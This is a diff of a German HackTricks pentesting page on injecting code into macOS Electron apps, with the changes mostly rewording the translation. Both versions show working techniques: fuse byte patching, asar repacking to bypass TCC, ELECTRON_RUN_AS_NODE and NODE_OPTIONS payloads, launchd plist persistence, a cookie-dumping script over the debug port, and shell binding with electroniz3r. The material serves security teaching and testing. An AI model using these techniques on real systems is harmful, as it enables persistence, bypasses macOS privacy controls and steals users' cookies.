@@ -1,41 +1,41 @@
-# macOS Electron-Anwendungen Injektion
+# macOS Electron-Anwendungen Injection
 
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
 
 </details>
 
 ## Grundlegende Informationen
 
 Wenn Sie nicht wissen, was Electron ist, finden Sie [**hier viele Informationen**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Aber vorerst wissen Sie einfach, dass Electron **node** ausführt.\
-Und node hat einige **Parameter** und **Umgebungsvariablen**, die verwendet werden können, um **anderen Code auszuführen**, der nicht in der angegebenen Datei enthalten ist.
+Und node hat einige **Parameter** und **Umgebungsvariablen**, die verwendet werden können, um **es dazu zu bringen, anderen Code auszuführen** als die angegebene Datei.
 
-### Electron-Fuses
+### Electron-Sicherungen
 
-Diese Techniken werden im Folgenden diskutiert, aber in letzter Zeit hat Electron mehrere **Sicherheitsflags hinzugefügt, um sie zu verhindern**. Dies sind die [**Electron-Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), die verwendet werden, um zu verhindern, dass Electron-Apps in macOS **beliebigen Code laden**:
+Diese Techniken werden als nächstes diskutiert, aber in letzter Zeit hat Electron mehrere **Sicherheitsflags hinzugefügt, um sie zu verhindern**. Dies sind die [**Electron-Sicherungen**](https://www.electronjs.org/docs/latest/tutorial/fuses), die verwendet werden, um zu verhindern, dass Electron-Apps in macOS **beliebigen Code laden**:
 
-* **`RunAsNode`**: Wenn deaktiviert, verhindert es die Verwendung der Umgebungsvariable **`ELECTRON_RUN_AS_NODE`**, um Code einzufügen.
-* **`EnableNodeCliInspectArguments`**: Wenn deaktiviert, werden Parameter wie `--inspect`, `--inspect-brk` nicht berücksichtigt. Dadurch wird verhindert, dass Code eingefügt wird.
-* **`EnableEmbeddedAsarIntegrityValidation`**: Wenn aktiviert, wird die geladene **`asar`**-**Datei** von macOS **validiert**. Dadurch wird das Einfügen von Code verhindert, indem der Inhalt dieser Datei geändert wird.
-* **`OnlyLoadAppFromAsar`**: Wenn dies aktiviert ist, wird anstelle der Suche in der folgenden Reihenfolge: **`app.asar`**, **`app`** und schließlich **`default_app.asar`**, nur app.asar überprüft und verwendet. Dadurch wird sichergestellt, dass bei Verwendung der **`embeddedAsarIntegrityValidation`**-Fuse kein nicht validierter Code geladen werden kann.
+* **`RunAsNode`**: Wenn deaktiviert, verhindert es die Verwendung der Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** zum Einspritzen von Code.
+* **`EnableNodeCliInspectArguments`**: Wenn deaktiviert, werden Parameter wie `--inspect`, `--inspect-brk` nicht respektiert. Auf diese Weise wird das Einspritzen von Code vermieden.
+* **`EnableEmbeddedAsarIntegrityValidation`**: Wenn aktiviert, wird die geladene **`asar`**-**Datei** von macOS **validiert**. Auf diese Weise wird das Einspritzen von Code verhindert, indem der Inhalt dieser Datei geändert wird.
+* **`OnlyLoadAppFromAsar`**: Wenn dies aktiviert ist, anstatt in folgender Reihenfolge zu laden: **`app.asar`**, **`app`** und schließlich **`default_app.asar`** zu suchen. Wird nur app.asar überprüft und verwendet, wodurch sichergestellt wird, dass bei **Kombination** mit der Sicherung **`embeddedAsarIntegrityValidation`** es **unmöglich** ist, **nicht validierten Code zu laden**.
 * **`LoadBrowserProcessSpecificV8Snapshot`**: Wenn aktiviert, verwendet der Browserprozess die Datei `browser_v8_context_snapshot.bin` für seinen V8-Snapshot.
 
-Eine weitere interessante Fuse, die das Einfügen von Code nicht verhindert, ist:
+Eine weitere interessante Sicherung, die das Einspritzen von Code nicht verhindern wird, ist:
 
-* **EnableCookieEncryption**: Wenn aktiviert, wird der Cookie-Speicher auf der Festplatte mit kryptografischen Schlüsseln auf OS-Ebene verschlüsselt.
+* **EnableCookieEncryption**: Wenn aktiviert, wird der Cookie-Speicher auf der Festplatte mithilfe von kryptografischen Schlüsseln auf OS-Ebene verschlüsselt.
 
-### Überprüfen der Electron-Fuses
+### Überprüfen der Electron-Sicherungen
 
-Sie können diese Flags von einer Anwendung aus **überprüfen** mit:
+Sie können diese Flags von einer Anwendung aus **überprüfen**:
 ```bash
 npx @electron/fuses read --app /Applications/Slack.app
 
@@ -51,45 +51,43 @@ LoadBrowserProcessSpecificV8Snapshot is Disabled
 ```
 ### Modifizieren von Electron-Fuses
 
-Wie in den [**Dokumenten erwähnt**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), werden die Konfigurationen der **Electron-Fuses** innerhalb der **Electron-Binärdatei** festgelegt, die irgendwo den String **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** enthält.
+Wie in den [**Dokumenten erwähnt**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), werden die Konfigurationen der **Electron-Fuses** innerhalb des **Electron-Binärdatei** konfiguriert, die irgendwo den String **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** enthält.
 
-In macOS-Anwendungen befindet sich dies normalerweise in `Anwendung.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`.
+In macOS-Anwendungen befindet sich dies typischerweise in `Anwendung.app/Inhalte/Frameworks/Electron Framework.framework/Electron Framework`
 ```bash
 grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
 Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-Sie können diese Datei in [https://hexed.it/](https://hexed.it/) laden und nach dem vorherigen String suchen. Nach diesem String können Sie im ASCII-Code eine Zahl "0" oder "1" sehen, die anzeigt, ob jede Sicherung deaktiviert oder aktiviert ist. Ändern Sie einfach den Hex-Code (`0x30` ist `0` und `0x31` ist `1`), um die Werte der Sicherungen zu ändern.
+Sie könnten diese Datei in [https://hexed.it/](https://hexed.it/) laden und nach dem vorherigen String suchen. Nach diesem String können Sie in ASCII eine Zahl "0" oder "1" sehen, die angibt, ob jede Sicherung deaktiviert oder aktiviert ist. Ändern Sie einfach den Hex-Code (`0x30` ist `0` und `0x31` ist `1`), um **die Sicherungswerte zu ändern**.
 
-<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Beachten Sie, dass, wenn Sie versuchen, die **`Electron Framework`-Binärdatei** in einer Anwendung mit diesen geänderten Bytes zu überschreiben, die App nicht ausgeführt wird.
+Beachten Sie, dass wenn Sie versuchen, die **`Electron Framework`-Binärdatei** innerhalb einer Anwendung mit diesen geänderten Bytes zu **überschreiben**, die App nicht gestartet wird.
 
 ## RCE Hinzufügen von Code zu Electron-Anwendungen
 
-Es können **externe JS/HTML-Dateien** vorhanden sein, die von einer Electron-App verwendet werden. Ein Angreifer könnte also Code in diese Dateien injizieren, dessen Signatur nicht überprüft wird, und beliebigen Code im Kontext der App ausführen.
+Es könnten **externe JS/HTML-Dateien** geben, die eine Electron-App verwendet. Ein Angreifer könnte also Code in diese Dateien einschleusen, dessen Signatur nicht überprüft wird, und beliebigen Code im Kontext der App ausführen.
 
 {% hint style="danger" %}
 Es gibt jedoch derzeit 2 Einschränkungen:
 
-* Die Berechtigung **`kTCCServiceSystemPolicyAppBundles`** ist erforderlich, um eine App zu ändern. Standardmäßig ist dies nicht mehr möglich.
-* Die kompilierte **`asap`**-Datei hat normalerweise die Sicherungen **`embeddedAsarIntegrityValidation`** und **`onlyLoadAppFromAsar`** aktiviert.
-
-Dies macht diesen Angriffsweg komplizierter (oder unmöglich).
+* Die Berechtigung **`kTCCServiceSystemPolicyAppBundles`** ist **erforderlich**, um eine App zu modifizieren, daher ist dies standardmäßig nicht mehr möglich.
+* Die kompilierte **`asap`**-Datei hat normalerweise die Sicherungen **`embeddedAsarIntegrityValidation`** und **`onlyLoadAppFromAsar`** aktiviert, was diesen Angriffsweg komplizierter (oder unmöglich) macht.
 {% endhint %}
 
-Beachten Sie, dass es möglich ist, die Anforderung von **`kTCCServiceSystemPolicyAppBundles`** zu umgehen, indem Sie die Anwendung in ein anderes Verzeichnis (wie **`/tmp`**) kopieren, den Ordner **`app.app/Contents`** in **`app.app/NotCon`** umbenennen, die **asar**-Datei mit Ihrem **bösartigen** Code ändern, sie wieder in **`app.app/Contents`** umbenennen und ausführen.
+Beachten Sie, dass es möglich ist, die Anforderung von **`kTCCServiceSystemPolicyAppBundles`** zu umgehen, indem Sie die Anwendung in ein anderes Verzeichnis kopieren (wie **`/tmp`**), den Ordner **`app.app/Contents`** in **`app.app/NotCon`** umbenennen, die **asar**-Datei mit Ihrem **bösartigen** Code ändern, sie wieder in **`app.app/Contents`** umbenennen und ausführen.
 
-Sie können den Code aus der asar-Datei mit entpacken:
+Sie können den Code aus der asar-Datei entpacken mit:
 ```bash
 npx asar extract app.asar app-decomp
 ```
-Und packen Sie es nach der Modifikation wieder zusammen mit:
+Und packen Sie es nach der Modifikation mit zurück:
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
 ## RCE mit `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
 
-Gemäß [**der Dokumentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node) wird, wenn diese Umgebungsvariable gesetzt ist, der Prozess als normaler Node.js-Prozess gestartet.
+Gemäß [**der Dokumentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node) wird, wenn diese Umgebungsvariable gesetzt ist, der Prozess als normaler Node.js-Prozess gestartet. 
 
 {% code overflow="wrap" %}
 ```bash
@@ -101,12 +99,12 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-Wenn die Fuse **`RunAsNode`** deaktiviert ist, wird die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ignoriert und dies funktioniert nicht.
+Wenn die Sicherung **`RunAsNode`** deaktiviert ist, wird die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ignoriert und dies funktioniert nicht.
 {% endhint %}
 
-### Injektion aus der App Plist
+### Injektion aus dem App-Plist
 
-Wie [**hier vorgeschlagen**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/) könnten Sie diese Umgebungsvariable in einer Plist missbrauchen, um die Persistenz aufrechtzuerhalten:
+Wie [**hier vorgeschlagen**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/) könnten Sie diese Umgebungsvariable in einem Plist missbrauchen, um die Persistenz aufrechtzuerhalten:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -132,7 +130,7 @@ Wie [**hier vorgeschlagen**](https://www.trustedsec.com/blog/macos-injection-via
 ```
 ## RCE mit `NODE_OPTIONS`
 
-Sie können die Payload in einer anderen Datei speichern und ausführen:
+Sie können das Payload in einer anderen Datei speichern und ausführen:
 
 {% code overflow="wrap" %}
 ```bash
@@ -145,14 +143,14 @@ NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Di
 {% endcode %}
 
 {% hint style="danger" %}
-Wenn die Fuse **`EnableNodeOptionsEnvironmentVariable`** deaktiviert ist, ignoriert die App die Umgebungsvariable **NODE\_OPTIONS** beim Start, es sei denn, die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ist gesetzt, die ebenfalls ignoriert wird, wenn die Fuse **`RunAsNode`** deaktiviert ist.
+Wenn die Sicherung **`EnableNodeOptionsEnvironmentVariable`** **deaktiviert** ist, ignoriert die App die Umgebungsvariable **NODE_OPTIONS** beim Start, es sei denn, die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ist gesetzt, was auch ignoriert wird, wenn die Sicherung **`RunAsNode`** deaktiviert ist.
 
-Wenn Sie **`ELECTRON_RUN_AS_NODE`** nicht setzen, erhalten Sie den Fehler: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
+Wenn Sie **`ELECTRON_RUN_AS_NODE`** nicht setzen, erhalten Sie den **Fehler**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
 {% endhint %}
 
-### Injektion aus der App Plist
+### Injektion aus dem App-Plist
 
-Sie könnten diese Umgebungsvariable in einer Plist missbrauchen, um die Persistenz beizubehalten, indem Sie diese Schlüssel hinzufügen:
+Sie könnten diese Umgebungsvariable in einem Plist missbrauchen, um Persistenz hinzuzufügen, indem Sie diese Schlüssel hinzufügen:
 ```xml
 <dict>
 <key>EnvironmentVariables</key>
@@ -168,9 +166,9 @@ Sie könnten diese Umgebungsvariable in einer Plist missbrauchen, um die Persist
 <true/>
 </dict>
 ```
-## RCE durch Inspektion
+## RCE mit Inspektion
 
-Laut [**diesem**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) Artikel, wenn Sie eine Electron-Anwendung mit Flaggen wie **`--inspect`**, **`--inspect-brk`** und **`--remote-debugging-port`** ausführen, wird ein **Debug-Port geöffnet**, auf den Sie zugreifen können (zum Beispiel von Chrome aus über `chrome://inspect`), und Sie können Code darauf **injizieren** oder sogar neue Prozesse starten.\
+Gemäß [**diesem**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) Artikel, wenn Sie eine Electron-Anwendung mit Flaggen wie **`--inspect`**, **`--inspect-brk`** und **`--remote-debugging-port`** ausführen, wird ein **Debug-Port geöffnet**, sodass Sie sich damit verbinden können (zum Beispiel von Chrome aus unter `chrome://inspect`) und Sie werden in der Lage sein, **Code einzuspritzen** oder sogar neue Prozesse zu starten.\
 Zum Beispiel:
 
 {% code overflow="wrap" %}
@@ -182,14 +180,14 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-Wenn die Fuse **`EnableNodeCliInspectArguments`** deaktiviert ist, ignoriert die App Node-Parameter (wie `--inspect`), wenn sie gestartet wird, es sei denn, die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ist gesetzt, die ebenfalls ignoriert wird, wenn die Fuse **`RunAsNode`** deaktiviert ist.
+Wenn die Sicherung **`EnableNodeCliInspectArguments`** deaktiviert ist, ignoriert die App **Node-Parameter** (wie `--inspect`), wenn sie gestartet wird, es sei denn, die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ist gesetzt, die ebenfalls ignoriert wird, wenn die Sicherung **`RunAsNode`** deaktiviert ist.
 
-Sie können jedoch immer noch den Electron-Parameter `--remote-debugging-port=9229` verwenden, aber die vorherige Payload funktioniert nicht, um andere Prozesse auszuführen.
+Sie könnten jedoch immer noch den **Electron-Parameter `--remote-debugging-port=9229`** verwenden, aber das vorherige Payload wird nicht funktionieren, um andere Prozesse auszuführen.
 {% endhint %}
 
-Mit dem Parameter **`--remote-debugging-port=9222`** ist es möglich, einige Informationen aus der Electron-App zu stehlen, wie z.B. die **History** (mit GET-Befehlen) oder die **Cookies** des Browsers (da sie im Browser entschlüsselt werden und es einen **JSON-Endpunkt** gibt, der sie liefert).
+Durch die Verwendung des Parameters **`--remote-debugging-port=9222`** ist es möglich, einige Informationen aus der Electron-App zu stehlen, wie die **Verlaufsinformationen** (mit GET-Befehlen) oder die **Cookies** des Browsers (da sie im Browser entschlüsselt werden und es einen **JSON-Endpunkt** gibt, der sie liefert).
 
-Sie können lernen, wie das [**hier**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) und [**hier**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) gemacht wird und das automatische Tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) oder ein einfaches Skript wie:
+Sie können lernen, wie das funktioniert [**hier**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) und [**hier**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) und das automatische Tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) oder ein einfaches Skript wie:
 ```python
 import websocket
 ws = websocket.WebSocket()
@@ -197,11 +195,11 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
-In [**diesem Blogpost**](https://hackerone.com/reports/1274695) wird dieses Debugging missbraucht, um einen headless Chrome **beliebige Dateien an beliebigen Orten herunterladen zu lassen**.
+In [**diesem Blogbeitrag**](https://hackerone.com/reports/1274695) wird dieses Debugging missbraucht, um einen headless Chrome **beliebige Dateien an beliebigen Orten herunterladen zu lassen**.
 
-### Injektion aus der App Plist
+### Injektion aus der App-Plist
 
-Sie könnten diese Umgebungsvariable in einer Plist missbrauchen, um die Persistenz zu erhalten, indem Sie diese Schlüssel hinzufügen:
+Sie könnten diese Umgebungsvariable in einer Plist missbrauchen, um Persistenz zu erhalten, indem Sie diese Schlüssel hinzufügen:
 ```xml
 <dict>
 <key>ProgramArguments</key>
@@ -218,17 +216,17 @@ Sie könnten diese Umgebungsvariable in einer Plist missbrauchen, um die Persist
 ## TCC-Bypass durch Ausnutzung älterer Versionen
 
 {% hint style="success" %}
-Der TCC-Daemon von macOS überprüft nicht die ausgeführte Version der Anwendung. Wenn Sie also mit keiner der zuvor genannten Techniken Code in eine Electron-Anwendung injizieren können, können Sie eine frühere Version der APP herunterladen und Code darauf injizieren, da sie immer noch die TCC-Berechtigungen erhält (sofern der Trust Cache dies nicht verhindert).
+Der TCC-Daemon von macOS überprüft nicht die ausgeführte Version der Anwendung. Wenn Sie also **keinen Code in einer Electron-Anwendung injizieren können** mit einer der vorherigen Techniken, könnten Sie eine frühere Version der APP herunterladen und Code darauf injizieren, da sie immer noch die TCC-Berechtigungen erhält (sofern der Trust Cache dies nicht verhindert).
 {% endhint %}
 
-## Ausführung von nicht-JS-Code
+## Ausführen von nicht-JS-Code
 
-Die zuvor genannten Techniken ermöglichen es Ihnen, **JS-Code im Prozess der Electron-Anwendung auszuführen**. Beachten Sie jedoch, dass die **Kindprozesse unter demselben Sandbox-Profil** wie die Elternanwendung ausgeführt werden und **deren TCC-Berechtigungen erben**.\
-Daher können Sie, wenn Sie beispielsweise Berechtigungen missbrauchen möchten, um auf Kamera oder Mikrofon zuzugreifen, einfach **eine andere Binärdatei aus dem Prozess heraus ausführen**.
+Die vorherigen Techniken ermöglichen es Ihnen, **JS-Code im Prozess der Electron-Anwendung auszuführen**. Denken Sie jedoch daran, dass die **Unterprozesse unter demselben Sandbox-Profil wie die übergeordnete Anwendung ausgeführt werden** und **deren TCC-Berechtigungen erben**.\
+Daher könnten Sie, wenn Sie Berechtigungen missbrauchen möchten, um beispielsweise auf Kamera oder Mikrofon zuzugreifen, einfach **eine andere Binärdatei aus dem Prozess heraus ausführen**.
 
 ## Automatische Injektion
 
-Das Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kann leicht verwendet werden, um **anfällige Electron-Anwendungen** zu finden, die installiert sind, und Code in sie einzufügen. Dieses Tool versucht, die Technik **`--inspect`** zu verwenden:
+Das Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kann einfach verwendet werden, um **anfällige Electron-Anwendungen zu finden**, die installiert sind, und Code darauf zu injizieren. Dieses Tool wird versuchen, die **`--inspect`**-Technik zu verwenden:
 
 Sie müssen es selbst kompilieren und können es wie folgt verwenden:
 ```bash
@@ -274,14 +272,14 @@ Shell binding requested. Check `nc 127.0.0.1 12345`
 
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
 
 </details>
